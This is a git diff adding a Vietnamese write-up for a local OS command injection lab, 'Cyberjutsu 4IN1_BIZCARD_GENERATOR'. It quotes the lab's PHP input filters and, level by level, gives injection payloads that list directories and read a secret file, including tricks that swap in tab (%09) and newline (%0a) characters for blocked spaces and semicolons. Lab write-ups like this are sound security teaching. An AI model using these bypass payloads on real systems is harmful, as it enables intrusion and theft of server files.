@@ -1,6 +1,8 @@
+# Write-up 4IN1_BIZCARD_GENERATOR
+Đây là write up của bài lab tiếp theo về chủ đề OS Command Injection của Cyberjutsu. Mọi người làm bài lab bằng cách dùng lệnh `docker-compose up --build` rồi truy cập vào localhost:5555 nhé.
 
+Trước hết, chúng ta sẽ nói sơ qua về cách web này hoạt động
 
-<<<<<<< HEAD
 Chúng ta cần ba tham số đó là level, type, và username. Tham số username sẽ được xử lí thông qua hàm `validate_username` tùy vào level. Cuối cùng, web sẽ xử lí các lệnh `cowsay` khác nhau theo `type` mà ta chọn.
 ```php
 switch($type){
@@ -55,11 +57,11 @@ $input = addslashes($input);
 
 ![test](./image/level1/1.png)
 
--   `;ls / #`
+-   `';ls / #`
 
 ![ls](./image/level1/2.png)
 
--   `;cat /secret_file #`
+-   `';cat /secret_file #`
 
 ![payload](./image/level1/3.png)
 
@@ -68,6 +70,38 @@ $input = addslashes($input);
 $input = substr($input,0,10);
 $input = addslashes($input);
 ```
-Ở level này, ta chỉ được sử dụng tối đa 10 kí tự
-=======
->>>>>>> parent of 66a2804 (ignore)
+Ở level này, ta chỉ được sử dụng tối đa 10 kí tự. Do mình đã biết flag sẽ nằm ở thư mục `/`, nên payload của level này sẽ là: `';cat /* #`
+
+![payload](./image/level2/1.png)
+## **3. Level 3**
+```php
+$input = preg_replace("/[\x{20}-\x{29}\x{2f}]/","",$input);
+$input = addslashes($input);
+```
+Ở level này, chúng ta không được sử dụng các kí tự quan trọng như là dấu cách, `"`,`'`, `#`, `/`,... (Nguồn: [asciitable.com](https://www.asciitable.com/)) bởi vì các kí tự đó sẽ bị xóa đi. Như vậy làm sao để vượt qua được rào cản này đây?
+
+Nhìn lại code một lần nữa, ta để ý thấy type figlet có cách xử lí hơi khác là sử dụng dấu `"` trong lệnh `figlet`. 
+```php
+case 'figlet':
+    $cowsay = <<<EOF
+    echo 'Hello $username' | cowsay -n ; figlet "Hello $username"
+    EOF;
+```
+Dấu `"` khác dấu `'` ở chỗ là các kí tự đặc biệt ở giữa cặp `"` vẫn giữ lại các chức năng vốn có của nó. Vì vậy, ta vẫn có thể thực hiện lệnh lồng trong lệnh khác bằng cặp `` ` ``. Như vậy, chúng ta không cần đến dấu `'`
+
+![ls](./image/level3/1.png)
+
+Nhưng chúng ta vẫn còn dấu cách và dấu `/`. Trong linux shell, dấu cách có thể thay thế bằng dấu tab (ở vị trí 09 trong bảng ascii). Với dấu `/`, chúng ta có thể xử lí bằng cách di chuyển ngược về thư mục `/` rồi `cat secret_file` ra (chúng ta vẫn dùng được dấu `;` để thực thi nhiều câu lệnh cùng một lúc).
+
+**Payload:** gán tham số username = `` `cd%09..;cd%09..;cd%09..;cat%09secret_file` `` và type = figlet. Kết quả như hình dưới:
+
+![payload](./image/level3/2.png)
+
+## **4. Level 4**
+```php
+$input = preg_replace("/[\x{20}-\x{29}\x{2f}]/","",$input);
+$input = preg_replace("/[\x{3b}-\x{40}]/","",$input);
+$input = addslashes($input);
+```
+Ở Level này có thêm các kí tự không được phép nhập vào, đáng chú ý là dấu `;`. Tuy vậy, ngoài `;`, `|`, `&`, chúng ta vẫn có thể phân cách các lệnh bằng dấu xuống dòng có vị trí trong bảng ascii là 0A (tương tự như lúc chúng ta Enter để thực hiện lệnh)
+**Payload:** gán tham số username = `` `cd%09..%0acd%09..%0acd%09..%0acat%09secret_file` `` và type = figlet. Kết quả như hình dưới:
